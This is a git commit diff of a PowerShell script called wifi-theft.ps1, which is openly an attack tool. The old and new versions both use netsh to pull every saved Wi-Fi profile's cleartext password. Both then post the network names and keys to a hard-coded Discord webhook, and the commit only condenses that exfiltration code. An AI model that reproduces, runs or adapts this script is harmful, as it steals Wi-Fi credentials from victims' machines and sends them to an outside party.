02a285850069ee933f1ed0eb72626c3de9fbd719
Aswin K <104525173+5T3P8R0@users.noreply.github.com>
2025-03-10 23:27:11 +0530

    Update wifi-theft.ps1

--- wifi-theft.ps1
+++ wifi-theft.ps1
@@ -1,12 +1,7 @@
-$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {($_ -split ":")[1].Trim()}
-$output = ""
-
-foreach ($profile in $wifiProfiles) {
-    $details = netsh wlan show profile name="$profile" key=clear
-    $output += "`n" + $details
+$wifi = (netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { ($_ -split ': ')[1].Trim() } | ForEach-Object { 
+    $ssid = $_
+    $pwd = (netsh wlan show profile name="$ssid" key=clear | Select-String 'Key Content' | ForEach-Object { ($_ -split ': ')[1].Trim() })
+    "$ssid : $pwd"
 }
-
-$webhook = "https://discord.com/api/webhooks/1348596367936716841/q-6dCI0Q1RPRKizEpmBBSGCbfZZKA5eB6zGsrt-N4ONPBTVHuCnqFzcD1PRAmPPlie6a"
-$body = @{ "content" = "```$output```" } | ConvertTo-Json -Compress
-
-Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
+$payload = @{content = ('```\n' + ($wifi -join "`n") + '\n```') } | ConvertTo-Json -Compress
+Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1348596367936716841/q-6dCI0Q1RPRKizEpmBBSGCbfZZKA5eB6zGsrt-N4ONPBTVHuCnqFzcD1PRAmPPlie6a' -Method Post -Body $payload -ContentType 'application/json'
